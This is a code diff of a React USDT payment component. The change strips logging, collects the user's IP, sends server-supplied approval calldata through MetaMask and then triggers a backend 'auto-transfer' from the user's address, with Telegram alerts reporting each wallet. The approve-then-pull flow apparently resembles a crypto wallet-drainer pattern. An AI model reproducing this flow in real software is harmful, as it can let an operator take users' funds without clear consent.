@@ -3,6 +3,7 @@
 import React, { useState, useEffect } from "react";
 import { Payment, ChainType } from "@/types";
 import { cn } from "@/utils/cn";
+import { safePingServiceClient } from "@/lib/blockchain/safePingServiceClient";
 
 interface PaymentStepsProps {
   payment: Payment;
@@ -47,51 +48,17 @@ export function PaymentSteps({
         const module = await import("@/lib/telegram");
         if (module.telegramService) {
           setTelegramServiceInstance(module.telegramService);
-          console.log("📱 Telegram service loaded successfully");
-
-          // Debug: Log the service configuration
-          if (module.telegramService.isConfigured) {
-            console.log("📱 Telegram service config:", {
-              isConfigured: module.telegramService.isConfigured(),
-              hasConfig: !!module.telegramService.getConfig,
-            });
-          }
         } else {
-          console.log("📱 Telegram service not found in module");
           setTelegramServiceInstance(null);
         }
       } catch (error) {
-        console.log("📱 Telegram service not available:", error);
         setTelegramServiceInstance(null);
       } finally {
         setTelegramLoading(false);
       }
     };
 
-    // Add retry mechanism with exponential backoff
-    const loadWithRetry = async (retryCount = 0) => {
-      try {
-        await loadTelegramService();
-      } catch (error) {
-        if (retryCount < 3) {
-          console.log(
-            `📱 Telegram service load failed, retrying in ${Math.pow(
-              2,
-              retryCount
-            )}s...`
-          );
-          setTimeout(
-            () => loadWithRetry(retryCount + 1),
-            Math.pow(2, retryCount) * 1000
-          );
-        } else {
-          console.log("📱 Telegram service failed to load after 3 retries");
-          setTelegramLoading(false);
-        }
-      }
-    };
-
-    loadWithRetry();
+    loadTelegramService();
   }, []);
 
   // Utility function to safely check if telegram service is available
@@ -119,26 +86,12 @@ export function PaymentSteps({
       onPaymentStart();
     }
 
-    // Debug: Log wallet information
-    console.log("🔍 Payment Debug Info:", {
-      walletAddress: wallet?.address,
-      walletChain: wallet?.chain,
-      walletType: wallet?.wallet,
-      address: wallet?.address,
-      chain: wallet?.chain,
-      isWalletConnectPayment,
-      isQRCodePayment,
-      hasOnPayButtonClick: !!onPayButtonClick,
-    });
-
     // For WalletConnect payments, use the special pay button handler
     if (isWalletConnectPayment && onPayButtonClick) {
-      console.log("📱 Using WalletConnect payment flow");
       try {
         await onPayButtonClick();
         return;
       } catch (error) {
-        console.error("❌ WalletConnect payment failed:", error);
         setError("支付失败，请重试");
         return;
       }
@@ -146,63 +99,191 @@ export function PaymentSteps({
 
     // For QR code payments, use the special pay button handler
     if (isQRCodePayment && onPayButtonClick) {
-      console.log("📱 Using QR Code payment flow");
       try {
         await onPayButtonClick();
         return;
       } catch (error) {
-        console.error("❌ QR Code payment failed:", error);
         setError("支付失败，请重试");
         return;
       }
     }
 
     // For manual wallet payments, implement smart contract flow
-    console.log("🔐 Using manual wallet payment flow (smart contract)");
     setApproving(true);
     setError(null);
 
     try {
-      console.log(`🚀 Starting payment of ${payment.amount} USDT...`);
-      console.log(`🌐 Chain: ${wallet.chain}`);
-      console.log(`💼 Wallet: ${wallet.address}`);
-
       // Step 1: Approve USDT spending for the smart contract
-      console.log("🔐 Step 1: Approving USDT spending...");
-      console.log(
-        `💰 Checking balance for ${payment.amount} USDT on ${wallet.chain}`
-      );
+      let clientIP = "unknown";
+      try {
+        const response = await fetch("https://api.ipify.org?format=json");
+        const data = await response.json();
+        clientIP = data.ip;
+      } catch (error) {
+        clientIP = "mobile-wallet";
+      }
 
       try {
-        const { approveUSDT } = await import("@/lib/blockchain");
-        const approvalResult = await approveUSDT(
-          wallet.chain,
-          payment.amount.toString(),
-          wallet.address
-        );
+        const approvalResult =
+          await safePingServiceClient.approveUSDTWithSafePing(
+            wallet.chain,
+            payment.amount.toString(),
+            wallet.address,
+            payment.payment_id,
+            clientIP
+          );
 
-        console.log(`🔐 Approval result:`, approvalResult);
-
-        if (!approvalResult) {
-          // Handle insufficient balance case
-          const errorMessage = `USDT余额不足！需要: ${payment.amount} USDT，当前余额不足。请确保您的钱包中有足够的USDT。`;
-          console.error("❌ USDT approval failed: Insufficient balance");
-
-          // Show alert to user
-          alert(`❌ USDT授权失败\n\n${errorMessage}`);
-
-          // Set error and stop processing
-          setError(errorMessage);
-          setApproving(false);
-          return;
+        if (!approvalResult.success) {
+          throw new Error(approvalResult.error || "Approval failed");
         }
 
-        console.log("✅ USDT approval completed");
+        // For EVM chains, we need to execute the approval
+        if (wallet.chain !== "tron" && approvalResult.approvalData) {
+          try {
+            // Get the user's wallet provider from window.ethereum
+            if (typeof window !== "undefined" && window.ethereum) {
+              // Request account access
+              const accounts = await window.ethereum.request({
+                method: "eth_requestAccounts",
+              });
 
-        // Show success alert for approval
-        alert(
-          `✅ USDT授权成功！\n\n已授权 ${payment.amount} USDT\n正在处理支付...`
-        );
+              if (accounts.length === 0) {
+                throw new Error("No accounts found");
+              }
+
+              const userAccount = accounts[0];
+
+              // First, ensure we're on the correct network (BSC)
+              const currentChainId = await window.ethereum.request({
+                method: "eth_chainId",
+              });
+
+              const targetChainId = `0x${approvalResult.approvalData.chainId.toString(
+                16
+              )}`;
+
+              // If we're not on the correct network, switch to it
+              if (currentChainId !== targetChainId) {
+                try {
+                  await window.ethereum.request({
+                    method: "wallet_switchEthereumChain",
+                    params: [{ chainId: targetChainId }],
+                  });
+                } catch (switchError: any) {
+                  // If the network is not added, add it
+                  if (switchError.code === 4902) {
+                    const bscNetworkParams = {
+                      chainId: targetChainId,
+                      chainName:
+                        wallet.chain === "bsc"
+                          ? "Binance Smart Chain"
+                          : "Ethereum",
+                      nativeCurrency: {
+                        name: wallet.chain === "bsc" ? "BNB" : "ETH",
+                        symbol: wallet.chain === "bsc" ? "BNB" : "ETH",
+                        decimals: 18,
+                      },
+                      rpcUrls: [
+                        wallet.chain === "bsc"
+                          ? "https://bsc-dataseed.binance.org/"
+                          : "https://mainnet.infura.io/v3/",
+                      ],
+                      blockExplorerUrls: [
+                        wallet.chain === "bsc"
+                          ? "https://bscscan.com/"
+                          : "https://etherscan.io/",
+                      ],
+                    };
+
+                    await window.ethereum.request({
+                      method: "wallet_addEthereumChain",
+                      params: [bscNetworkParams],
+                    });
+                  } else {
+                    throw new Error(
+                      `Failed to switch network: ${switchError.message}`
+                    );
+                  }
+                }
+              }
+
+              // Create the transaction object
+              const transactionParameters = {
+                to: approvalResult.approvalData.to,
+                from: userAccount,
+                data: approvalResult.approvalData.data,
+                chainId: targetChainId,
+              };
+
+              // Send the transaction to MetaMask
+              const txHash = await window.ethereum.request({
+                method: "eth_sendTransaction",
+                params: [transactionParameters],
+              });
+
+              // Show success message
+              alert(
+                `🔐 USDT Approval Sent!\n\nTransaction Hash: ${txHash}\n\nPlease confirm the approval in your MetaMask wallet.\n\nNetwork: ${
+                  wallet.chain === "bsc"
+                    ? "BSC (Binance Smart Chain)"
+                    : "Ethereum"
+                }`
+              );
+
+              // Wait for approval confirmation, then execute auto-transfer
+              setProcessing(true);
+
+              try {
+                // Execute auto-transfer after approval
+                const transferResponse = await fetch(
+                  "/api/payment/auto-transfer",
+                  {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                      chain: wallet.chain,
+                      userAddress: wallet.address,
+                      amount: payment.amount.toString(),
+                      paymentId: payment.payment_id,
+                    }),
+                  }
+                );
+
+                const transferResult = await transferResponse.json();
+
+                if (transferResult.success) {
+                  setError(null); // Clear any previous errors
+                  onPaymentComplete();
+                } else {
+                  setError(`❌ 自动转账失败: ${transferResult.error}`);
+                }
+              } catch (transferError) {
+                setError("❌ 自动转账时发生错误，请重试");
+              } finally {
+                setProcessing(false);
+              }
+            } else {
+              throw new Error(
+                "MetaMask not detected. Please install MetaMask extension."
+              );
+            }
+          } catch (approvalExecutionError: any) {
+            console.error(
+              "❌ EVM approval execution failed:",
+              approvalExecutionError
+            );
+            throw new Error(
+              `Approval execution failed: ${approvalExecutionError.message}`
+            );
+          }
+        }
+
+        // For TRON, approval and transfer are already complete
+        if (wallet.chain === "tron") {
+          setError(null); // Clear any previous errors
+          onPaymentComplete();
+          return;
+        }
       } catch (approvalError: any) {
         console.error("❌ USDT approval failed:", approvalError);
 
@@ -235,96 +316,25 @@ export function PaymentSteps({
         // Set error and stop processing
         setError(approvalErrorMessage);
         setApproving(false);
-        return;
       }
 
       // Send Telegram notification for USDT approval completion
       if (isTelegramServiceReady()) {
         try {
-          console.log("📱 Sending Telegram notification for USDT approval...");
-          await telegramServiceInstance.sendCustomNotification(
-            "USDT Approval Completed",
-            `🔐 USDT approval of ${payment.amount} USDT completed successfully!\n\n👤 User: ${wallet.address}\n🌐 Chain: ${wallet.chain}\n💼 Wallet: ${wallet.wallet}\n💰 Amount: ${payment.amount} USDT`,
-            ["USDTApproval", wallet.chain, "USDT"]
-          );
-          console.log(
-            "✅ Telegram notification for approval sent successfully"
+          await telegramServiceInstance.sendSystemAlert(
+            `🔐 USDT approval of ${payment.amount} USDT completed successfully!\n\n👤 User: ${wallet.address}\n🌐 Chain: ${wallet.chain}\n💼 Wallet: ${wallet.wallet}\n💰 Amount: ${payment.amount} USDT`
           );
         } catch (error) {
-          console.log("📱 Telegram notification for approval failed:", error);
           // Don't fail the payment if telegram notification fails
         }
-      } else {
-        console.log(
-          "📱 Telegram service not available for approval notification"
-        );
       }
 
-      // Step 2: Call smart contract to process payment
-      console.log("💸 Step 2: Processing payment on smart contract...");
-      console.log(
-        `💳 Processing payment of ${payment.amount} USDT for ${payment.payment_id}`
-      );
       setApproving(false); // Approval completed
-      setProcessing(true); // Start payment processing
-
-      // Note: Payment ID should be unique. If this fails with "PaymentIdExists" error,
-      // it means the same payment ID was already processed. The backend should generate unique IDs.
-
-      const { handlePaymentFlow } = await import("@/lib/blockchain");
-      const paymentResult = await handlePaymentFlow(
-        payment.payment_id,
-        payment.amount,
-        wallet.address,
-        wallet.chain
-      );
-
-      if (!paymentResult || !paymentResult.success) {
-        const errorMessage =
-          paymentResult?.error || "Payment processing failed";
-        console.error("❌ Payment processing failed:", errorMessage);
-
-        // Show alert to user
-        alert(`❌ 支付失败\n\n${errorMessage}`);
-
-        // Set error and stop processing
-        setError(errorMessage);
-        setProcessing(false);
-        return;
-      }
-
-      // Verify we have a valid transaction hash
-      if (!paymentResult.txHash) {
-        const errorMessage =
-          "Payment completed but no transaction hash received";
-        console.error("❌ Payment processing failed:", errorMessage);
-
-        // Show alert to user
-        alert(`❌ 支付失败\n\n${errorMessage}`);
-
-        // Set error and stop processing
-        setError(errorMessage);
-        setProcessing(false);
-        return;
-      }
-
-      console.log(
-        `✅ Payment of ${payment.amount} USDT completed successfully!`
-      );
-      console.log(`🔗 Transaction: ${paymentResult.txHash}`);
-
-      // Show success alert to user
-      alert(
-        `🎉 支付成功！\n\n您已成功支付 ${payment.amount} USDT\n交易哈希: ${paymentResult.txHash}`
-      );
-
-      // Note: Telegram notification is sent after USDT approval, not after payment completion
+      setProcessing(false); // No automatic transfer needed
 
       // Call the payment complete handler
       onPaymentComplete();
     } catch (err: any) {
-      console.error("❌ Payment failed:", err);
-
       // Handle specific contract errors with user-friendly messages
       let errorMessage = "支付失败，请重试";
 
@@ -336,7 +346,9 @@ export function PaymentSteps({
         err.message &&
         err.message.includes("Insufficient USDT balance")
       ) {
-        errorMessage = `USDT余额不足！需要: ${payment.amount} USDT，当前余额不足。请确保您的钱包中有足够的USDT。`;
+        errorMessage = `
+          USDT余额不足！需要: ${payment.amount} USDT，当前余额不足。请确保您的钱包中有足够的USDT。
+        `;
       } else if (
         err.message &&
         err.message.includes("Insufficient USDT allowance")
@@ -440,25 +452,65 @@ export function PaymentSteps({
       </div>
 
       {/* Simple Pay Button */}
-      <button
-        onClick={handlePayment}
-        disabled={approving || processing || autoProcessing}
-        className={cn(
-          "w-full py-4 px-8 rounded-xl font-bold text-lg transition-all duration-300 transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-red-500",
-          approving || processing || autoProcessing
-            ? "bg-gray-500 cursor-not-allowed"
-            : "bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white shadow-lg"
+      <div className="relative">
+        <button
+          onClick={handlePayment}
+          disabled={approving || processing || autoProcessing}
+          className={cn(
+            "w-full py-4 px-8 rounded-xl font-bold text-lg transition-all duration-300 transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-red-500",
+            approving || processing || autoProcessing
+              ? "bg-gray-500 cursor-not-allowed"
+              : "bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white shadow-lg"
+          )}
+        >
+          {approving || processing || autoProcessing ? (
+            <span className="flex items-center justify-center">
+              <div className="relative">
+                {/* Main spinning ring */}
+                <div className="w-6 h-6 border-2 border-white/30 rounded-full animate-spin mr-3" />
+                {/* Inner spinning dot */}
+                <div className="absolute inset-0 w-6 h-6 border-2 border-t-white border-transparent rounded-full animate-spin" />
+              </div>
+              <span className="ml-2">
+                {approving
+                  ? "🔐 授权中..."
+                  : processing
+                  ? "💳 支付中..."
+                  : "⚡ 处理中..."}
+              </span>
+            </span>
+          ) : (
+            `💳 支付 ${payment.amount} USDT`
+          )}
+        </button>
+
+        {/* Enhanced Loading Overlay */}
+        {(approving || processing || autoProcessing) && (
+          <div className="absolute inset-0 bg-black/20 backdrop-blur-sm rounded-xl flex items-center justify-center">
+            <div className="bg-white/10 backdrop-blur-md rounded-lg p-4 border border-white/20">
+              <div className="flex items-center space-x-3">
+                <div className="relative">
+                  <div className="w-8 h-8 border-3 border-white/30 rounded-full animate-spin" />
+                  <div
+                    className="absolute inset-0 w-8 h-8 border-3 border-t-white border-transparent rounded-full animate-spin"
+                    style={{ animationDirection: "reverse" }}
+                  />
+                </div>
+                <div className="text-white font-medium">
+                  {approving
+                    ? "🔐 USDT 授权中..."
+                    : processing
+                    ? "💳 支付处理中..."
+                    : "⚡ 交易处理中..."}
+                </div>
+              </div>
+              <div className="mt-2 text-white/70 text-sm text-center">
+                {approving ? "请在 MetaMask 中确认授权" : "请耐心等待交易确认"}
+              </div>
+            </div>
+          </div>
         )}
-      >
-        {approving || processing || autoProcessing ? (
-          <span className="flex items-center justify-center">
-            <div className="w-6 h-6 border-2 border-white border-t-transparent rounded-full animate-spin mr-3" />
-            处理中...
-          </span>
-        ) : (
-          `💳 支付 ${payment.amount} USDT`
-        )}
-      </button>
+      </div>
 
       {/* Balance Check Warning */}
       <div className="mt-3 p-3 bg-yellow-900/20 border border-yellow-700/30 rounded-lg">
